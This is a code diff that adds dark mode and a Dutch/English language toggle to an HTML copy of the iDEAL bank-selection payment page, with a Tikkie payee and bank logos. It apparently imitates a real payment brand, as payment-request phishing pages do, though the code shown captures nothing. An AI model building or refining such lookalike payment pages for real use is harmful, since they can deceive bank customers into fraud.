@@ -210,7 +210,7 @@
     .ideal-footer-bookmark svg { width: 16px; height: 16px; fill: #333; }
     .ideal-copyright { font-size: 12px; color: #888; }
 
-    /* ========== BANK SELECTIE PAGE ========== */
+    /* ========== BANK SELECTIE PAGE (LIGHT) ========== */
     #page-bank { background: #fff; color: #1a1a1a; }
     .bank-header {
       display: flex;
@@ -220,6 +220,7 @@
       border-bottom: 1px solid #eee;
       position: relative;
       min-height: 72px;
+      background: #fff;
     }
     .bank-header-logo {
       position: absolute;
@@ -237,12 +238,14 @@
       font-size: 14px;
       font-weight: 500;
       line-height: 1.35;
+      color: #1a1a1a;
     }
     .bank-header-info .amount {
       font-size: 20px;
       font-weight: 700;
       margin-top: 1px;
       letter-spacing: -0.02em;
+      color: #1a1a1a;
     }
     .bank-back {
       display: inline-block;
@@ -271,6 +274,7 @@
       text-align: center;
       margin-bottom: 12px;
       letter-spacing: -0.03em;
+      color: #1a1a1a;
     }
     .bank-subtitle {
       text-align: center;
@@ -286,6 +290,7 @@
       font-size: 13px;
       font-weight: 600;
       margin-bottom: 10px;
+      color: #1a1a1a;
     }
     .bank-btn {
       display: flex;
@@ -302,7 +307,7 @@
       cursor: pointer;
       font-family: inherit;
       text-align: left;
-      transition: border-color .15s, box-shadow .15s;
+      transition: border-color .15s, box-shadow .15s, background .15s;
     }
     .bank-btn:hover {
       border-color: #c0c0c0;
@@ -390,6 +395,71 @@
       fill: none;
       stroke: #333;
       stroke-width: 2;
+    }
+
+    /* ========== BANK PAGE DARK MODE ========== */
+    #page-bank.dark {
+      background: #1a1a1a;
+      color: #fff;
+    }
+    #page-bank.dark .bank-header {
+      background: #c6005c;
+      border-bottom: none;
+    }
+    #page-bank.dark .bank-header-info .name,
+    #page-bank.dark .bank-header-info .amount {
+      color: #fff;
+    }
+    #page-bank.dark .bank-back {
+      color: #c6005c;
+    }
+    #page-bank.dark .bank-back:hover {
+      color: #ff4d94;
+    }
+    #page-bank.dark .bank-main h1 {
+      color: #fff;
+    }
+    #page-bank.dark .bank-subtitle {
+      color: #ccc;
+    }
+    #page-bank.dark .last-label {
+      color: #fff;
+    }
+    #page-bank.dark .bank-btn {
+      background: #2a2a2a;
+      border-color: #444;
+      color: #fff;
+    }
+    #page-bank.dark .bank-btn:hover {
+      border-color: #666;
+      background: #333;
+      box-shadow: none;
+    }
+    #page-bank.dark .bank-divider {
+      border-top-color: #444;
+    }
+    #page-bank.dark .bank-footer {
+      background: #111;
+      color: #999;
+    }
+    #page-bank.dark .bank-footer a {
+      color: #999;
+    }
+    #page-bank.dark .bank-footer a:hover {
+      color: #fff;
+    }
+    #page-bank.dark .bank-footer-actions button {
+      color: #fff;
+    }
+    #page-bank.dark .bank-copyright {
+      color: #777;
+    }
+    #page-bank.dark .bank-bookmark {
+      background: #2a2a2a;
+      border-color: #444;
+    }
+    #page-bank.dark .bank-bookmark svg {
+      stroke: #fff;
     }
 
     @media (min-width: 768px) {
@@ -597,16 +667,16 @@
         <img src="logos/ideal.png" alt="iDEAL wero">
       </div>
       <div class="bank-header-info">
-        <div class="name">Peter van Eggele via Tikkie</div>
+        <div class="name" data-i18n="header-name">Peter van Eggele via Tikkie</div>
         <div class="amount">€9,99</div>
       </div>
     </header>
-    <button type="button" class="bank-back" id="btn-terug-bank">Terug</button>
+    <button type="button" class="bank-back" id="btn-terug-bank" data-i18n="back">Terug</button>
     <main class="bank-main">
-      <h1>Kies je bank</h1>
-      <p class="bank-subtitle">U wordt doorgestuurd naar de geselecteerde bank om de betaling te voltooien.</p>
+      <h1 data-i18n="title">Kies je bank</h1>
+      <p class="bank-subtitle" data-i18n="subtitle">U wordt doorgestuurd naar de geselecteerde bank om de betaling te voltooien.</p>
       <div class="last-used">
-        <div class="last-label">Laatst gebruikte bank</div>
+        <div class="last-label" data-i18n="last-used">Laatst gebruikte bank</div>
         <button class="bank-btn" type="button">
           <img src="logos/abn-amro.png" alt="ABN AMRO">
           ABN AMRO
@@ -690,13 +760,13 @@
     </main>
     <footer class="bank-footer">
       <div class="bank-footer-links">
-        <a href="#">Hoe werkt het?</a>
-        <a href="#">Over ons</a>
-        <a href="#">Privacyverklaring</a>
+        <a href="#" data-i18n="how">Hoe werkt het?</a>
+        <a href="#" data-i18n="about">Over ons</a>
+        <a href="#" data-i18n="privacy">Privacyverklaring</a>
       </div>
       <div class="bank-footer-actions">
-        <button type="button">English</button>
-        <button type="button">Donkere modus</button>
+        <button type="button" id="btn-lang">English</button>
+        <button type="button" id="btn-dark">Donkere modus</button>
       </div>
       <div class="bank-copyright">© 2026 iDEAL</div>
     </footer>
@@ -765,7 +835,7 @@
     // Ideal → Bank selectie (Kies je bank)
     document.getElementById('btn-kies-bank').addEventListener('click', () => {
       showPage(pageBank);
-      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff');
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', pageBank.classList.contains('dark') ? '#1a1a1a' : '#ffffff');
     });
 
     // Bank selectie → Ideal (Terug)
@@ -779,6 +849,69 @@
       btn.addEventListener('click', () => {
         console.log('Geselecteerd:', btn.textContent.trim());
       });
+    });
+
+    // ========== LANGUAGE TOGGLE ==========
+    let currentLang = 'nl';
+    const translations = {
+      nl: {
+        'header-name': 'Peter van Eggele via Tikkie',
+        'back': 'Terug',
+        'title': 'Kies je bank',
+        'subtitle': 'U wordt doorgestuurd naar de geselecteerde bank om de betaling te voltooien.',
+        'last-used': 'Laatst gebruikte bank',
+        'how': 'Hoe werkt het?',
+        'about': 'Over ons',
+        'privacy': 'Privacyverklaring',
+        'lang-btn': 'English',
+        'dark-btn': 'Donkere modus',
+        'light-btn': 'Lichte modus'
+      },
+      en: {
+        'header-name': 'Peter van Eggele via Tikkie',
+        'back': 'Back',
+        'title': 'Choose your bank',
+        'subtitle': 'You will be redirected to the selected bank to complete the payment.',
+        'last-used': 'Last used bank',
+        'how': 'How does it work?',
+        'about': 'About us',
+        'privacy': 'Privacy statement',
+        'lang-btn': 'Nederlands',
+        'dark-btn': 'Dark mode',
+        'light-btn': 'Light mode'
+      }
+    };
+
+    function applyLanguage(lang) {
+      currentLang = lang;
+      document.querySelectorAll('[data-i18n]').forEach(el => {
+        const key = el.getAttribute('data-i18n');
+        if (translations[lang][key]) {
+          el.textContent = translations[lang][key];
+        }
+      });
+      // Update language button
+      document.getElementById('btn-lang').textContent = translations[lang]['lang-btn'];
+      // Update dark mode button text
+      const isDark = pageBank.classList.contains('dark');
+      document.getElementById('btn-dark').textContent = isDark
+        ? translations[lang]['light-btn']
+        : translations[lang]['dark-btn'];
+      document.documentElement.lang = lang;
+    }
+
+    document.getElementById('btn-lang').addEventListener('click', () => {
+      applyLanguage(currentLang === 'nl' ? 'en' : 'nl');
+    });
+
+    // ========== DARK MODE TOGGLE ==========
+    document.getElementById('btn-dark').addEventListener('click', () => {
+      pageBank.classList.toggle('dark');
+      const isDark = pageBank.classList.contains('dark');
+      document.getElementById('btn-dark').textContent = isDark
+        ? translations[currentLang]['light-btn']
+        : translations[currentLang]['dark-btn'];
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', isDark ? '#1a1a1a' : '#ffffff');
     });
   </script>
 </body>
